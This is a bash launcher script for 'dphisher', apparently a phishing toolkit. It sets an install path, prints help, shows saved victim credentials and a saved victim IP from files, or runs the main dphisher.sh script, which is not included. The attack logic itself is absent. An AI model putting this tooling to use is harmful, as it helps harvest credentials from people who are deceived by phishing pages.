#!/bin/bash

# https://github.com/dhanushspatel/dphisher

if [[ $(uname -o) == *'Android'* ]];then
	dphisher_ROOT="/data/data/com.termux/files/usr/opt/dphisher"
else
	export dphisher_ROOT="/opt/dphisher"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run dphisher type \`dphisher\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $dphisher_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $dphisher_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $dphisher_ROOT
	bash ./dphisher.sh
fi
